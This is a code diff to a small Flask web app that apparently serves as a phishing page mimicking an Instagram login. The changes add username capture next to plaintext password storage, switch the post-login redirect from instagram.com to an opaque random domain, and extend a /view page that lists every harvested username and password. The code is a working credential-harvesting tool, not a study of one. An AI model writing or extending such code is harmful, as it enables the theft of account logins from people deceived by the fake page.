@@ -11,6 +11,7 @@ db = SQLAlchemy(app)
 # -------- Database Model --------
 class Login(db.Model):
     id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(300), nullable=False)
     password = db.Column(db.String(200), nullable=False)
 
 
@@ -18,13 +19,14 @@ class Login(db.Model):
 def login():
     if request.method == "POST":
         password = request.form.get("password")
+        username = request.form.get("username")
 
         # Save directly (no encryption)
-        new_entry = Login(password=password)
+        new_entry = Login(username=username, password=password)
         db.session.add(new_entry)
         db.session.commit()
 
-        return redirect("https://instagram.com")
+        return redirect("https://a7d63d08-c5c2-4892-a9e1-8b0039016861.i143.xyz")
 
     # Serve login.html from same folder
     return  render_template("login.html")
@@ -38,7 +40,7 @@ def view():
 
     output = ""
     for row in data:
-        output += f"ID: {row.id} | Password: {row.password}<br>"
+        output += f"ID: {row.id} | Username: {row.username} | Password: {row.password}<br> "
 
     return output
    
@@ -48,5 +50,4 @@ with app.app_context():
 
 if __name__ == "__main__":
     app.run(debug=True)
-
 
